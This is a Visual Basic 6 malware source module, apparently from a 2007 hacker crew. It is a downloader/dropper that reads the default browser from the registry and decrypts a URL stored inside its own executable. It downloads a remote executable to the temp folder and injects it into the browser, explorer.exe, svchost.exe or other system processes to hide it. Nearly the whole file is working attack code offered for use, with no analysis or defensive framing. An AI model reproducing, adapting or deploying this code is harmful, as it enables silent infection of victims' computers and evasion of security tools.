Attribute VB_Name = "modMain"
'NOTE: PROGRAM WON'T RUN IN IDE
'This program will simply inject itself into the default browser,
'download a specific file from the net, read it into an array of bytes and execute it in memory.
'Source created by MarjinZ
'Date: 09/11-2007
Private Const HELLO_MOTHERFUCKS = "This is by TrD and D4rkDays so bow to us biatch"
Dim sTargetProcessPath As String
Dim sTargetProcessName As String
Dim sTargetFile As String
Dim sWebTarget

Sub Main()
On Error GoTo Default
Dim tmp() As String
Dim temp As String
Dim fileData As String
Dim tmpSplit() As String
Dim ff As Long
    
Call GetBrowserName 'Call this function if you want to inject the file into the default browser
'sTargetProcessPath = sTargetProcessName 'Comment this line if you want to use the default browser

tmp = Split(sTargetProcessPath, "\")
sTargetProcessName = tmp(UBound(tmp))

    If LCase(App.EXEName & ".exe") = LCase(sTargetProcessName) Then 'Check if the file has been injected
        'If program was injected to the default browser, then execute the following code
        
        Open Environ("temp") & "\tmp.dat" For Binary Access Read As #1
            fileData = Input(FileLen(Environ("temp") & "\tmp.dat"), #1)
        Close #1
        Kill Environ("temp") & "\tmp.dat"
        tmpSplit = Split(fileData, "###")
        
        sWebTarget = EncryptData(tmpSplit(0), "frmMain", False)
                
        Call CallAPIByName("urlmon.dll", "URLDownloadToFileA", 0, sWebTarget, Environ("temp") & "\temp.exe", 0, 0)
        'Call URLDownloadToFile(0, sWebTarget, Environ("temp") & "\temp.exe", 0, 0)
        
        Select Case EncryptData(tmpSplit(1), "frmMain", False)
            Case "browser"
                If PerformInjecton(sTargetProcessPath, Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "explorer"
                If PerformInjecton(Environ("windir") & "\explorer.exe", Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "ctfmon"
                If PerformInjecton(Environ("windir") & "\system32\ctfmon.exe", Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "svchost"
                If PerformInjecton(Environ("windir") & "\system32\svchost.exe", Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "calc"
                If PerformInjecton(Environ("windir") & "\system32\calc.exe", Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "cmd"
                If PerformInjecton(Environ("windir") & "\system32\cmd.exe", Environ("temp") & "\temp.exe") = 1 Then GoTo Default
            Case "null"
                Shell Environ("temp") & "\temp.exe" 'If user chosed to not inject, then execute normally
        End Select
    Else
        'To inject a file into another process, call the function like this:
        'Call PerformInjection(process filepath , file path)
        
        Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #2
            fileData = Input(FileLen(App.Path & "\" & App.EXEName & ".exe"), #2)
        Close #2
        Erase tmpSplit
        tmpSplit = Split(fileData, "##########", 3)
        
        Kill Environ("temp") & "\tmp.dat"
        Open Environ("temp") & "\tmp.dat" For Binary Access Write As #3
            Put #3, , tmpSplit(1) & "###" & tmpSplit(2)
        Close #3
        
        Call PerformInjecton(sTargetProcessPath, App.Path & "\" & App.EXEName & ".exe")
        End
    End If
    Exit Sub
Default: 'Default injection
    Shell Environ("temp") & "\temp.exe" 'If user chosed to not inject, then execute normally
End Sub

Public Sub wait(s As Single)
Dim T1 As Single
T1 = Timer
Do While T1 + s > Timer
DoEvents
Loop
End Sub

'Only if we want to inject to the default browser (FWB++)
Private Sub GetBrowserName()
    On Error Resume Next
    Dim Regentry As String
    Dim SplittedDB() As String

    Set TheReg = CreateObject("Wscript.Shell")
    Regentry = TheReg.RegRead("HKEY_CLASSES_ROOT\HTTP\shell\open\command\")
    Regentry = Replace(Regentry, Chr(34), "")
    Regentry = Mid(Regentry, 1, InStr(1, LCase(Regentry), ".exe") + 3)
    SplittedDB = Split(Regentry, "\")
    sTargetProcessName = SplittedDB(UBound(SplittedDB)) 'This will return name of the process, in case you need it
    sTargetProcessPath = Regentry
End Sub
